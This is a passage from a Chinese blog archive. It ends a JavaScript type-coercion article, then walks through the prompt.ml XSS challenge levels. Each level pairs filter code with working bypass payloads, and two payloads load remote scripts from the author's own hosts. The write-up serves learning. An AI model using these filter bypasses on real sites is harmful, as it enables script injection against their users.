ToNumber(x) == y 的结果。7、若 Type(y) 为 Boolean， 返回比较 x == ToNumber(y) 的结果。8、若 Type(x) 为 String 或 Number，且 Type(y) 为 Object，返回比较 x == ToPrimitive(y) 的结果。9、若 Type(x) 为 Object 且 Type(y) 为 String 或 Number， 返回比较 ToPrimitive(x) == y 的结果。10、返回 false。 上面主要分为两类，x、y类型相同时，和类型不相同时。 类型相同时，没有类型转换，主要注意NaN不与任何值相等，包括它自己，即NaN !== NaN。 类型不相同时， 1、x,y 为null、undefined两者中一个 // 返回true 2、x、y为Number和String类型时，则转换为Number类型比较。 3、有Boolean类型时，Boolean转化为Number类型比较。 4、一个Object类型，一个String或Number类型，将Object类型进行原始转换后，按上面流程进行原始值比较。 3.1、== 例子解析所以类型不相同时，可以会进行上面几条的比较，比如： 123456789var a = &#123; valueOf: function () &#123; return 1; &#125;, toString: function () &#123; return '123' &#125;&#125;true == a // true; 首先，x与y类型不同，x为boolean类型，则进行ToNumber转换为1,为number类型。接着，x为number，y为object类型，对y进行原始转换，ToPrimitive(a, ?),没有指定转换类型，默认number类型。而后，ToPrimitive(a, Number)首先调用valueOf方法，返回1，得到原始类型1。最后 1 == 1， 返回true。 我们再看一段很复杂的比较，如下： 1[] == !&#123;&#125; &gt; 1、! 运算符优先级高于==，故先进行！运算。2、!{}运算结果为false，结果变成 [] == false比较。3、根据上面第7条，等式右边y = ToNumber(false) = 0。结果变成 [] == 0。4、按照上面第9条，比较变成ToPrimitive([]) == 0。 按照上面规则进行原始值转换，[]会先调用valueOf函数，返回this。 不是原始值，继续调用toString方法，x = [].toString() = ‘’。 故结果为 ‘’ == 0比较。5、根据上面第5条，等式左边x = ToNumber(‘’) = 0。 所以结果变为： 0 == 0，返回true，比较结束。 最后我们看看文章开头说的那道题目： 123456789const a = &#123; i: 1, toString: function () &#123; return a.i++; &#125;&#125;if (a == 1 &amp;&amp; a == 2 &amp;&amp; a == 3) &#123; console.log('hello world!');&#125; 1、当执行a == 1 &amp;&amp; a == 2 &amp;&amp; a == 3 时，会从左到右一步一步解析，首先 a == 1，会进行上面第9步转换。ToPrimitive(a， Number) == 1。 2、ToPrimitive(a, Number)，按照上面原始类型转换规则，会先调用valueOf方法，a的valueOf方法继承自Object.prototype。返回a本身，而非原始类型，故会调用toString方法。 3、因为toString被重写，所以会调用重写的toString方法，故返回1，注意这里是i++，而不是++i，它会先返回i，在将i+1。故ToPrimitive(a, Number) = 1。也就是1 == 1，此时i = 1 + 1 = 2。 4、执行完a == 1返回true，会执行a == 2，同理，会调用ToPrimitive(a, Number)，同上先调用valueOf方法，在调用toString方法，由于第一步，i = 2此时，ToPrimitive(a, Number) = 2， 也就是2 == 2, 此时i = 2 + 1。 5、同上可以推导 a == 3也返回true。故最终结果 a == 1 &amp;&amp; a == 2 &amp;&amp; a == 3返回true 其实了解了以上隐形转换的原理，你有没有发现这些隐式转换并没有想象中那么难。 参考文章：es5文档]]></content>
      <tags>
        <tag>基础知识</tag>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[This_1s_pr0mpt.ml_writeup]]></title>
    <url>%2F2020%2F02%2F27%2F2020.02.27%EF%BC%8896%EF%BC%89%2F</url>
    <content type="text"><![CDATA[这是我在无意中遇到的一个xss 网站，花了将近一周的时间才做完，每道题的背后都会隐藏着许多知识点，其中关于浏览器编码问题，我将近用了三天的时间才搞清楚；当然还有很多知识点就不在这一一列举了，但是我会在下文中逐一进行详解。这些都不是重点，我想说的是，通过这个网站的学习，让我对 xss 的原理、攻击和防御都有了新的了解，这次我就借这次做题，详细系统的再总结一下 xss 知识点，当然这并不意味着结束了 xss 的学习，这只不过是一个开头，好了！步入正题。 0x00 简单闭合问题① JS 代码12345function escape(input) &#123; // warm up // script should be executed without user interaction return '&lt;input type="text" value="' + input + '"&gt;';&#125; ② 题目分析 通过题目中给出的 JS 代码，可以得到：JS 直接将我们的输入进行 escape 编码（该方法不会对ASCII 字母和数字进行编码，也不会对* @ - _ + . /。其他所有的字符都会被转义序列替换），并没有经过过滤条件，相当于直接返回input 的输入。因为被编码后的字符还会被 JavaScript 解析器重新解析。 ③ 相关知识点 escape 函数的用法 浏览器 JavaScript 解析器的编码 ④ payload 根据上述分析，我们可以这样构造 payload： &quot;&gt;&lt;script&gt;prompt(1)&lt;/script&gt;// 注：在做过第五题后，有人（比如我）可能会想这里可不可以用 type=image 覆盖 &lt;input&gt; 标中的 type 值，再通过 onerror 或者 onload 执行 prompt(1)呢？尝试之后会发现并不可行，因为以第一次出现的为结果。 ⑤ HTML source1&lt;input type="text" value=""&gt;&lt;script&gt;prompt(1)&lt;/script&gt;//"&gt; ⑥ xss 类型 简单的标签闭合类型 0x01 标签闭合① JS 代码12345678function escape(input) &#123; // tags stripping mechanism from ExtJS library // Ext.util.Format.stripTags var stripTagsRE = /&lt;\/?[^&gt;]+&gt;/gi; input = input.replace(stripTagsRE, ''); return '&lt;article&gt;' + input + '&lt;/article&gt;';&#125; ② 题目分析 /gi 标识全局搜索匹配、不区分大小写。将匹配的替换为空，它会把所有匹配 &lt;tag&gt; 或 &lt;/tag&gt; 的标签全部剥离。由于一个标签即使没有最后面的 &gt; 也是可以被浏览器正确解析的。或者最后使用 // ③ 相关知识点 JavaScript 中的 replace 函数知识点： 和 python 中的 replace 的区别 它的一些特性，将会在下文中接触 &lt;img&gt; 标签的 onload 和 onerror 的区别 ④ payload onload 有关的 payload： 注：onload 事件会在页面或图像加载完成后立即发生。 12&lt;img src="https://muzibing.github.io/images/95-1.png" onload=prompt(1) //&lt;body onload="prompt(1)" onerror 有关的 payload： 注：onerror 事件当错误发生时运行脚本。 12&lt;img src="#" onerror = prompt(1) // (src引用的图片不存在则执行onerror事件）&lt;input src = # type = "image" onerror = prompt(1) // ⑤ HTML source123456789onload:================================================================================&lt;article&gt;&lt;img src="https://muzibing.github.io/images/95-1.png" onload=prompt(1) //&lt;/article&gt;&lt;article&gt;&lt;body onload="prompt(1)"&lt;/article&gt; onerror:================================================================================&lt;article&gt;&lt;img src="#" onerror = prompt(1) //&lt;/article&gt;&lt;input src = # type = "image" onerror = "prompt(1)" ⑥ xss 类型 通过标签特性绕过正则表达式的过滤，再利用标签的事件，来达到 xss 攻击目的。 0x02 实体编码绕过① JS 代码1234567function escape(input) &#123; // v-- frowny face input = input.replace(/[=(]/g, ''); // ok seriously, disallows equal signs and open parenthesis return input;&#125; ② 题目分析 JS 代码的作用是将 = 或 ( 过滤掉，然后返回输出。 ③ 相关知识点 escape 函数的作用 &lt;svg&gt; 的特性：&lt;svg&gt; 直接继承自 XML，一般情况下，它的解析规则为：除非被 CDATA 包围，否则实体编码都会被转义。 eval.call 的功能 ④ payload1payload1:&lt;svg&gt;&lt;script&gt;prompt&amp;#x28;1)&lt;/script&gt;&lt;/svg&gt; 上面的 payload 是通过 &lt;svg&gt; 标签的特性，在 JS 解析器 解码之前，HTML 解析 会将 &lt;svg&gt; 字符串中中的实体编码解码，所以能够执行成功。 注：本人憨批了一把，当时想既然可以用 HTML 实体字符绕过，那么可不可以用 URL 编码 或者 JavaScript 编码 呢？第二个想法真的相当于憨批了，因为 escape 函数就是用来解码 JavaScript 编码 的，肯定不能绕过呀！第一个想法还靠点谱，还想了一个 payload： &lt;a href = &quot;javascript:prompt%281%29&quot;&gt;test&lt;/a&gt; 看着还挺靠谱，可是已经忘了给定了匹配规则：将 = 或 ( 过滤掉，然后返回输出。所以 = 在这里就被清除了。 1payload2:&lt;script&gt;eval.call`$&#123;'prompt\x281)'&#125;`&lt;/script&gt; ⑤ HTML source1&lt;svg&gt;&lt;script&gt;prompt&amp;#x28;1)&lt;/script&gt;&lt;/svg&gt; ⑥ xss 类型 实体编码绕过。当然也有 URL 和 JS 编码绕过，这个得根据实际来看。 0x03 闭合注释① JS 代码1234567function escape(input) &#123; // filter potential comment end delimiters input = input.replace(/-&gt;/g, '_'); // comment the input to avoid script execution return '&lt;!-- ' + input + ' --&gt;';&#125; ② 题目分析 JS 代码通过 replace 函数的替换规则，将 -&gt; 替换为 _，但是这道题目就是为了逃逸出 &lt;!-- --&gt; 注释，那么应该怎么逃出来呢？ ③ 相关知识点 &lt;!-- --&gt; 和 &lt;!-- --!&gt; 的功能以及区别，html注释支持以下两种方式： &lt;!-- xxx --&gt; &lt;!-- xxx --!&gt; ④ payload 根据相关知识点，我们可以这样构造 payload： 1--!&gt;&lt;script&gt;prompt(1)&lt;/script&gt;// ⑤ HTML source1&lt;!-- --!&gt;&lt;script&gt;prompt(1)&lt;/script&gt;// --&gt; ⑥ xss 类型 这是一道闭合注释类型的题目，后面还有两道。 0x04 URL 编码绕过① JS 代码1234567891011function escape(input) &#123; // make sure the script belongs to own site // sample script: http://prompt.ml/js/test.js if (/^(?:https?:)?\/\/prompt\.ml\//i.test(decodeURIComponent(input))) &#123; var script = document.createElement('script'); script.src = input; return script.outerHTML; &#125; else &#123; return 'Invalid resource.'; &#125;&#125; ② 题目分析 先看这一行： if (/^(?:https?:)?\/\/prompt\.ml\//i.test(decodeURIComponent(input))){} 说明输入一定要符合正则表达式中的格式： http(s可有可无)://prompt.ml/ 如果输入字符串的部分（i）格式符合上述格式，JS 代码接着就会建立 &lt;script&gt; 标签，并且它的 src 属性等于输入的网址，然后返回的是网页上的输出内容。所以我们需要引入外部文件中的脚本中要含有：prompt(1)。 ③ 相关知识点 URI 完整的格式，以及符号 @ 的作用； decodeURIComponent() 函数的作用，以及 escape 、encodeURIComponent、decodeURIComponent 和 unescape 函数的功能； Basic Auth 语法 正则表达式后的 i、g、gi、ig 和 m 的含义： i：忽略大小写 g：全文查找出现的所有匹配字符 gi 和 ig：全文查找、忽略大小写 m：多行查找 ④ payload1https://prompt.ml%2f:pwd@localhost/xss.js 如果我们输入的 payload 必须完全符合 JS 代码中的限制，那么就得是这个形式： https://prompt.ml/@localhost/xss.js 但是浏览器识别的正确 URI 是这样的： 综上考虑，我们的输入必须要满足的两个条件相互矛盾，但是我们可以利用 decodeURIComponent() 函数的功能：将一些符号的 URL 编码解码为对应的符号，那么我们的输入就可以将 @ 前面的 / 符号写成它的 URL 编码：%2f，因此得到上述的 payload。 注明： 此 payload 在谷歌浏览器上可能不会正常执行，因为 chrome 在 2017 年规定内嵌资源不让加用户名密码了，所以上述的 payload 需要在火狐浏览器才能被执行。 若要追求最短 payload ，密码部分 pwd 是可以不要的，但是 : 和 @ 必须保留，且根据 相对协议地址 原理，http: 也是可以不要的。 ⑤ HTML source1&lt;script src="https://prompt.ml%2f@muzibing.github.io/xss.js"&gt;&lt;/script&gt; ⑥ xss 类型 利用 URI 格式的特性以及函数的功能的 URL编码绕过 题目。 0x05 属性覆盖及换行绕过① JS 代码1234567function escape(input) &#123; // apply strict filter rules of level 0 // filter "&gt;" and event handlers input = input.replace(/&gt;|on.+?=|focus/gi, '_'); return '&lt;input value="' + input + '" type="text"&gt;';&#125; ② 题目分析 JS 代码对 &gt;、on* =和 focus 对大小写不敏感的进行全局匹配，然后将输入放到 input 中的 value 值中。 ③ 相关知识点 对 \ 标签属性的覆盖：以第一个出现的为真实值（第一个出现的属性值将后续相同属性名的值进行覆盖）； 事件（还包括标签名，属性等）与等号可以不在一行，一样会被执行； ④ payload123456789101112" type="image" src="2" onerror =prompt(1)"=======================================还可以写成如下，也可以执行：" type="image" src="2" onerror =prompt(1) " 其实 type=&quot;text&quot; 就是个提示，input 标签可根据 type 改变自身为不同的元素类型，从而可以使用该类型的的属性触发 js 。题目设定的默认类型是 text ，即输入框，这种类型可以触发 js 的属性只有 onfocus，但是 focus 被过滤了，所以需要使用其他类型。通过对属性 type 值的覆盖，使得 input 的属性变为 image ，通过加载图片有误，触发 onerror 事件。 ⑤ HTML source12&lt;input value="" type="image" src="2" onerror =prompt(1)"" type="text"&gt; ⑥ xss 类型 input 属性值的覆盖类型题目 0x06 DOM 破坏① JS 代码1234567891011121314151617181920212223242526272829303132function escape(input) &#123; // let's do a post redirection try &#123; // pass in formURL#formDataJSON // e.g. http://httpbin.org/post#&#123;"name":"Matt"&#125; var segments = input.split('#'); var formURL = segments[0]; var formData = JSON.parse(segments[1]); var form = document.createElement('form'); form.action = formURL; form.method = 'post'; for (var i in formData) &#123; var input = form.appendChild(document.createElement('input')); input.name = i; input.setAttribute('value', formData[i]); &#125; return form.outerHTML + ' \n\&lt;script&gt; \n\ // forbid javascript: or vbscript: and data: stuff \n\ if (!/script:|data:/i.test(document.forms[0].action)) \n\ document.forms[0].submit(); \n\ else \n\ document.write("Action forbidden.") \n\&lt;/script&gt; \n\ '; &#125; catch (e) &#123; return 'Invalid form data.'; &#125;&#125; ② 题目分析 try 模块内的代码主要功能是：将输入的字符串划分为两部分，一部分是 URI，另一个部分是 JSON 数据，再建立一个form 标签，将 URL 赋值给 action 属性，对 method 赋值 post 方法。如果 form 中的 action 属性是伪协议就输出 Action forbideen。 输入内容以 # 分隔 左侧内容放入 &lt;form&gt; 的 action 属性 右侧内容是 json 格式，每一对 key-val 构造成 &lt;form&gt; 内的一个 &lt;input&gt; 子标签，其中 key 作为 &lt;input&gt; 的 name 属性值、val 作为 input 的 value 属性值 只要 &lt;form&gt; 的 action 属性值通过正则校验，则会调用 &lt;form&gt; 的 submit() 函数触发 action 行为 要在 &lt;form&gt; 的 action 属性执行 javascript 代码，可以构造这样的 payload： 1javascript:alert(1)#&#123;"EXP":"M02"&#125; 但是由于 document.forms[0].action 的内容被正则过滤了，导致 javascript:alert(1) 无法执行。但是这个过滤是不完善的，可以绕过。关键在于 document.forms[0].action 的指向。当 &lt;form&gt; 的子标签中没有任何名为 &lt;action&gt; 的子标签时， document.forms[0].action 指向的就是 &lt;form&gt; 自身的 action 属性。但若 &lt;form&gt; 的子标签中，有任一子标签名为 &lt;action&gt; 时， document.forms[0].action 会优先指向该子标签。这样，正则过滤所校验的值就是子标签 &lt;action&gt; 的值，而非 &lt;form&gt; 标签自身的 action 属性。 ③ 相关知识点 DOM 破坏后，form 标签中属性ID 和 name的变化 如果form元素的某个属性名和 input 元素的 id/name 值一样，那么该 form 的属性就会被 input 元素的属性值所覆盖。 并不是某些博客中所写的：action有这样的一个特性，如果前后都有action，访问action标签时访问的是后面的action的值。。而且在同一个标签中，存在相同名称的属性，第一个出现的属性值将后续相同属性名的值进行覆盖； JSON 数据的读取函数：JSON.parseInt() form 标签的 action 属性以及其他知识点 ④ payload1javascript:prompt(1)#&#123;"action":"text"&#125; payload 被分解成如下 HTML source 的形式： &lt;form action=&quot;javascript:prompt(1)&quot; method=&quot;post&quot;&gt;&lt;input name=&quot;action&quot; value=&quot;text&quot;&gt;&lt;/form&gt; 将前面的伪协议添加 action 的属性值，并将 JSON 数据中的 &quot;action&quot; 赋值给 input 标签中的 name 属性，并将 text 赋值给 value 值。因为 DOM 被破坏，所以 document.forms[0].action 的 action 是 input 中的 name 的 action，为object HTMLInputElement 所以 if 条件为真，执行 document.forms[0].submit() ，向 javascript:prompt 提交表单，成功执行脚本。 虽然题目会把我们输入的 json 构造成 &lt;form&gt; 内的 &lt;input&gt; 子标签，但是我们无法直接构造标签名为 &lt;action&gt; 。不过 json 的 key 会作为 &lt;action&gt; 标签的 name 属性值，而我们恰恰可以通过 name 属性为标签更名。 例如 &lt;input name=&quot;action&quot;&gt; 的名字实际是 action ，而非 input 。于是我们可以构造这样的 payload 绕过针对 action 的正则过滤：javascript:alert(1)#{&quot;action&quot;:&quot;EXP&quot;}。至此，只需要把 alert 改成 prompt 即可完成挑战，最终 payload 为：javascript:prompt(1)#{&quot;action&quot;:&quot;EXP&quot;} ⑤ HTML source123456789101112131415&lt;form action="javascript:prompt(1)" method="post"&gt;&lt;input name="action" value="text"&gt;&lt;/form&gt; &lt;script&gt; // forbid javascript: or vbscript: and data: stuff if (!/script:|data:/i.test(document.forms[0].action)) document.forms[0].submit(); else document.write("Action forbidden.") &lt;/script&gt;&lt;/form&gt; &lt;script&gt; // forbid javascript: or vbscript: and data: stuff if (!/script:|data:/i.test(document.forms[0].action)) document.forms[0].submit(); else document.write("Action forbidden.") &lt;/script&gt; ⑥ xss 类型 通过破坏 DOM，使得 id 和 name 属性混乱，达到绕过的作用。 0x07 注释绕过 / # 号绕过① JS 代码12345678function escape(input) &#123; // pass in something like dog#cat#bird#mouse... var segments = input.split('#'); return segments.map(function(title) &#123; // title can only contain 12 characters return '&lt;p class="comment" title="' + title.slice(0, 12) + '"&gt;&lt;/p&gt;'; &#125;).join('\n');&#125; ② 题目分析 以 # 号为标志，划分自字符串，并将划分后得到的每个字符串放在 &lt;title&gt; 标签内部，且每个标签 title 内部的字符串长度不能大于 12。 ③ 相关知识点 javascript的``模板字符串 eval 函数的特性 JavaScript 的特点： 在 HTML 语境中，&lt;script&gt; 和 &lt;/script&gt; 标签之间的内容默认视为 js 代码 js 代码换行后依然会自动拼接并生效（但是函数名/变量名要完整，不能破开到两行） js 代码内容之间的注释会被自动忽略 \ 的特性 ④ payload1234payload1:"&gt;&lt;script&gt;`#$&#123;prompt(1)&#125;#`&lt;/script&gt; // javascript的``模板字符串payload2:"&gt;&lt;script&gt;/*#*/a='prom'/*#*/+'pt(1)'/*#*/eval(a)/*#*/&lt;/script&gt; //eval 函数的特性payload3:"&gt;&lt;svg/a='#'onload='/*#*/prompt(1)' // 官方答案payload4:"&gt;&lt;script&gt;/*#*/prompt(/*#*/1)/*#*/&lt;/script&gt; ⑤ HTML source1234567891011121314151617181920212223payload1_HTML_soure:&lt;p class="comment" title=""&gt;&lt;script&gt;`"&gt;&lt;/p&gt;&lt;p class="comment" title="$&#123;prompt(1)&#125;"&gt;&lt;/p&gt;&lt;p class="comment" title="`&lt;/script&gt;"&gt;&lt;/p&gt;=============================================payload2_HTML_soure:&lt;p class="comment" title=""&gt;&lt;script&gt;/*"&gt;&lt;/p&gt;&lt;p class="comment" title="*/a='prom'/*"&gt;&lt;/p&gt;&lt;p class="comment" title="*/+'pt(1)'/*"&gt;&lt;/p&gt;&lt;p class="comment" title="*/eval(a)/*"&gt;&lt;/p&gt;&lt;p class="comment" title="*/&lt;/script&gt;"&gt;&lt;/p&gt;=============================================payload3_HTML_soure:&lt;p class="comment" title=""&gt;&lt;svg/a='"&gt;&lt;/p&gt;&lt;p class="comment" title="'onload='/*"&gt;&lt;/p&gt;&lt;p class="comment" title="*/prompt(1)'"&gt;&lt;/p&gt;=============================================payload4_HTML_soure:&lt;p class="comment" title=""&gt;&lt;script&gt;/*"&gt;&lt;/p&gt;&lt;p class="comment" title="*/prompt(/*"&gt;&lt;/p&gt;&lt;p class="comment" title="*/1)/*"&gt;&lt;/p&gt;&lt;p class="comment" title="*/&lt;/script&gt;"&gt;&lt;/p&gt;======================= ====================== 注意： &lt;script&gt; 和 &lt;/script&gt; 标签用于声明 js 代码的范围，这两个标签不能从中间任何位置破开到两行，否则多行注释 /* */ 就不会起作用了。另外我在测试 payload 的时候，也尝试过 &lt;!-- --&gt; HTML 注释，但是尖括号会造成标签错位导致注入失败，有兴趣的同学可以研究下。 ⑥ xss 类型 利用 # 号进行绕过 0x08 Unicode 编码逃逸① JS 代码12345678910function escape(input) &#123; // prevent input from getting out of comment // strip off line-breaks and stuff input = input.replace(/[\r\n&lt;/"]/g, ''); return ' \n\&lt;script&gt; \n\ // console.log("' + input + '"); \n\&lt;/script&gt; ';&#125; ② 题目分析 &lt;script&gt; 标签内的 // 注释了我们输入的内容，不管输入什么内容都被注释掉，并且正则表达式将 \r\n 过滤掉。 ③ 相关知识点 换行的思想 ④ payload 在 console 控制台中输入 &#39;\u2028prompt(1)\u2028--&gt;&#39;，得到的结果就是 payload 1" prompt(1) --&gt;" 由于 console 被注释掉，我们输入的脚本无法被执行，所以我们需要换行，但是由于\r\n 回车换行符都被过滤掉了，因此无法直接换行。虽然 ASCII 字符的换行符被过滤了，但是在 JS 里面是可以直接使用 Unicode 字符的，即可以使用 Unicode 的换行符进行绕过。查一下 Unicode 空字符的编码表，其中换行符的编码是 \u000A 和 \u2028。但是 \u000A 等价于 ASCII 的 \n ，前面知道它被过滤了无法使用，所以可以使用 \u2028 作为替代。 这里成功使用假设\u2028字符换行，则跳出了 // 的注释： 1234&lt;script&gt; // console.log("prompt(1)");&lt;/script&gt; 但事实上这段代码由于语法错误，prompt(1) 是无法执行的，原因是末尾的 &quot;); ，我们在 prompt(1) 后面再次添加换行符 \u2028： 12345&lt;script&gt; // console.log("prompt(1)");&lt;/script&gt; 虽然这样把 &quot;); 换到另一行，依然是语法错误，还是因为 &quot;); ，我们需要将它注释掉，但是尖括号 &lt; 、双引号 &quot; 、反斜杠 / 也都被过滤了，所以既没办法提前闭合 /script， 也没办法使用另一个函数 fun(&quot; 向后闭合引号，当然多行注释 /* 和行注释 // 也没办法使用了，就更不用说 &lt;!-- HTML 注释了（而且在 JS 区域内也没法用）。 这里需要使用到 JS 中的一个注释黑魔法：在 JS 代码中，当 --&gt; 位于行首时（左侧不能有任何非空字符），那么它相当于行注释。因此在 &quot;); 换行符前面加上 --&gt;，就可以成功注释掉 &quot;); 。 因为payload在console.log中，所以题目并不会帮我们把 Unicode 编码 \u2028 直接转换为换行符，那么我们就需要直接输入这个换行符。但是使用键盘是无法输入这个换行符的，这里我借助了 console 将其直接打印出来。 ⑤ HTML source123&lt;script&gt; // console.log(" prompt(1) --&gt;"); &lt;/script&gt; ⑥ xss 类型 console.log() 换行符的绕过 / Unicode 编码逃逸 0x09 ECMAScript① JS 代码123456789function escape(input) &#123; // filter potential start-tags input = input.replace(/&lt;([a-zA-Z])/g, '&lt;_$1'); // use all-caps for heading input = input.toUpperCase(); // sample input: you shall not pass! =&gt; YOU SHALL NOT PASS! return '&lt;h1&gt;' + input + '&lt;/h1&gt;';&#125; ② 题目分析 replace 将 &lt;[a-zA-Z] 变为 &lt;_[a-zA-Z]，并且对变化后的字符串全部转化成大写，返回 &lt;h1&gt; + input + &lt;/h1&gt;; ③ 相关知识点 javascript 外部文件的引用; js 的 scrpit, src 和 域名 的大小写不敏感 / HTML 的标签名和属性名都是大小写不敏感 toUpperCase() 的特性：根据 ECAMScript 定义，它不仅转换英文字母，也转换一些Unicode字符，即它有意把某些 Unicode 字符映射到某些 ASCII 字符（串）： Unicode 的 ı 通过 toUpperCase 会被转换成 ASCII 的 I Unicode 的 ſ 通过 toUpperCase 会被转换成 ASCII 的 S 涉及其他相关性不大的知识点： 在 https 网页中引入 http 资源：比如引入一个js文件，会被直接 block 掉的。在 HTTPS 页面里通过AJAX 的方式请求 HTTP 资源，也会被直接 block 掉的。但是在 http 网页中引入 https 资源不会被 block 掉。 解决方法（不可知）：在相应的页面的里加上这句代码 &lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;upgrade-insecure-requests&quot;&gt; ，意思是自动将http的不安全请求升级为 https。 ④ payloads123payload1：&lt;ımg src=0 onerror=&amp;#112;&amp;#114;&amp;#111;&amp;#109;&amp;#112;&amp;#116;(1) /&gt;payload2：&lt;ſvg&gt;&lt;ſcript&gt;&amp;#112;&amp;#114;&amp;#111;&amp;#109;&amp;#112;&amp;#116;(1)&lt;/script&gt;&lt;/svg&gt;payload3：&lt;ſcript src="http://192.168.126.132/%70%61%79%6c%6f%61%64.%6a%73"&gt;&lt;/script&gt; payload1 解析 先把 prompt 编码成 &amp;#112;&amp;#114;&amp;#111;&amp;#109;&amp;#112;&amp;#116; ，这样实体编码在输出到前端之前，从而绕过 toUpperCase 。看到别人又在外面加了一个 svg 标签，其实没有必要。 payload2 解析 因为 &lt;script&gt; 标签内部无法进行 HTML 实体解码 所以这里需要加上 svg 标签。 payload3 解析 这个 payload 一定要好好的解析一下，通过前期的学习可以得到HTML 的标签名和属性名都是大小写不敏感，于是第一次构造的 payload 为：&lt;ſcript src=&quot;http://192.168.126.132/payload.js&quot;&gt;&lt;/script&gt;，这个主机是我用虚拟机搭建的一个 web 站点，于是屁颠屁颠的填入上述的 payload，但是令我惊讶的是没有被被执行！！于是我在菜鸟教程搭建的环境上去尝试该脚本，发现一个这样的错误： 在查询了相关的资料后，发现这是因为在 https 网页中引入 http 资源，会被直接 block 掉的。原来菜鸟教程的 protocol 是 https，所以不能引入 http 协议的资源，我再去看看 prompt.ml 的协议，是不是也是这个原因造成的，但是令人失望的是它的协议也是 http (http://prompt.ml/)，我将上述的 payload 再次提交，查看流量数据，果然找到了问题所在： 问题就是因为我们输入的 payload.js 资源名称被大写为 PAYLOAD.JS ，而服务器无法找到该名称的资源，因此无法成功执行prompt(1)，既然找到问题就好办了，我利用了 URL 编码 将 payload.js 进行绕过，使得 JS 代码无法过滤，但是能被 URI 解析器 解析，所以构造的 payload3 就被成功的执行了。 ⑤ HTML source1234567891011payload1:&lt;h1&gt;&lt;IMG SRC=0 ONERROR=&amp;#112;&amp;#114;&amp;#111;&amp;#109;&amp;#112;&amp;#116;(1) /&gt;&lt;/h1&gt;========================================================================payload2:&lt;h1&gt;&lt;SVG&gt;&lt;SCRIPT&gt;&amp;#112;&amp;#114;&amp;#111;&amp;#109;&amp;#112;&amp;#116;(1)&lt;/SCRIPT&gt;&lt;/SVG&gt;&lt;/h1&gt;========================================================================payload3:&lt;h1&gt;&lt;SCRIPT SRC="HTTP://192.168.126.132/%70%61%79%6C%6F%61%64.%6A%73"&gt;&lt;/SCRIPT&gt;&lt;/h1&gt;======================================================================== ⑥ xss 类型 这是一道 ECMAScript 绕过的题目，但是涉及的知识点很多。 0x0A 绕过题目① JS 代码123456789function escape(input) &#123; // (╯°□°）╯︵ ┻━┻ input = encodeURIComponent(input).replace(/prompt/g, 'alert'); // ┬──┬ ノ( ゜-゜ノ) chill out bro input = input.replace(/'/g, ''); // (╯°□°）╯︵ /(.□. \）DONT FLIP ME BRO return '&lt;script&gt;' + input + '&lt;/script&gt; ';&#125; ② 题目分析 首先是将输入进行一次 encodeURIComponent 编码，然后将 prompt 替换为 alert ，最后又将 &#39; 过滤掉。 ③ 相关知识点 decodeURIComponent() 函数的作用； 绕过的思想 ④ payload12payload1：prompt(p'rompt(1)) &amp; alert(p'rompt(1))payload2：eval(String.fromCharCode(112).concat(String.fromCharCode(114)).concat(String.fromCharCode(111)).concat(String.fromCharCode(109)).concat(String.fromCharCode(112)).concat(String.fromCharCode(116)).concat(String.fromCharCode(40)).concat(String.fromCharCode(49)).concat(String.fromCharCode(41))) payload1： 主要说一下绕过的思想，通过对 &#39; 符号的过滤，我们可以利用这一特性来构造 payload。 注：&#39; 的位置和数量是可以变的，只要在 prompt 单词内部。 payload2： 构造 payload2 时花了很长时间，一开始是用 JS 解析器 在解析标识符名称时（如函数名、属性名）等，若遇到 Unicode 会直接进行解码，并使得标识符依旧生效。于是构造了这个 payload： \u0070\u0072\u006f\u006d\u0070\u0074(1) 绕过 replace 以在前端直接构造 prompt(1) , 但是 \ 被 encodeURIComponent 转码成了 %5C ，失败。后来又想到 eval 函数，于是构造这个 payload： eval(String.fromCharCode(112,114,111,109,112,116,40,49,41)) 期望可以绕过 replace 逐字符构造 prompt(1) ，但是 , 被 encodeURIComponent 转码成了 %2C ，还是失败。转念一想，既然不能用逗号 , 拼接字符，那么直接用 concat 函数就可以了，于是构造了 payload2。 ⑤ HTML source12payload1：&lt;script&gt;alert(prompt(1))&lt;/script&gt;payload2：&lt;script&gt;eval(String.fromCharCode(112).concat(String.fromCharCode(114)).concat(String.fromCharCode(111)).concat(String.fromCharCode(109)).concat(String.fromCharCode(112)).concat(String.fromCharCode(116)).concat(String.fromCharCode(40)).concat(String.fromCharCode(49)).concat(String.fromCharCode(41)))&lt;/script&gt; ⑥ xss 类型 简单一个根据 JS 规则，来进行绕过问题。 0x0B In Exception① JS 代码123456789101112131415function escape(input) &#123; // name should not contain special characters var memberName = input.replace(/[[|\s+*/\\&lt;&gt;&amp;^:;=~!%-]/g, ''); // data to be parsed as JSON var dataString = '&#123;"action":"login","message":"Welcome back, ' + memberName + '."&#125;'; // directly "parse" data in script context return ' \n\&lt;script&gt; \n\ var data = ' + dataString + '; \n\ if (data.action === "login") \n\ document.write(data.message) \n\&lt;/script&gt; ';&#125; ② 题目分析 这道题目可以简化为： 123&lt;script&gt; document.write('"Welcome back, ' + input + '."');&lt;/script&gt; 其中 input 是我们输入的内容，允许输入的字符只有 a-z、A-Z、0-9、&quot;、&#39;、(、) 。 ③ 相关知识点 英文下的符号 JS 的异常机制： JS 会把 () 前面的字符串识别是 函数名，但由于函数不存在，会抛出异常，换言之， () 里面可能会被识别为函数的参数表，参数表优先于函数名被解析。 JavaScript 的 in 和 instanceof的语法 ④ payload12payload1:"(prompt(1)) instanceof " payload2:"(prompt(1)) in " 如果我们只是输入 &quot;(prompt(1))&quot; 的话，那么 HTML source 的结果是这样的： 12345&lt;script&gt; var data = &#123;"action":"login","message":"Welcome back, "(prompt(1))"."&#125;; if (data.action === "login") document.write(data.message) &lt;/script&gt; 需要注意到，在注入点的后面，还有一个小尾巴 . 。换言之，其实我们注入 &quot;(prompt(1))&quot; 这个 payload 后，得到的 JS 代码其实是这样的：document.write(&quot;Welcome back, &quot;(prompt(1))&quot;.&quot;);而这个小尾巴最致命的地方，就是它先于参数表的 prompt(1) 被解析，导致先抛出了一个 SyntaxError 语法错误的异常， prompt(1) 则无法被执行。 那么接下来就需要处理掉这个语法错误的问题，使得参数表可以被解析。但是由于 + 被过滤了，无法利用它拼接函数返回值和字符串去解决这个尾巴。不过 JS 还有一个 in （instanceof 也可以）操作符同样可以达到拼接目的，其使用方法是 [a_object] in [b_object] ，用于判断一个对象 a 是否被对象 b 包含。虽然 in 对 object 类型有要求，但是即使是类型错误，也只会在运行时抛出，而不会在最开始解析时就直接报语法错误，从而可以解决前面语法错误导致参数表的 prompt(1) 没有被解析的问题。 执行顺序 解析并执行参数表的 prompt(1) 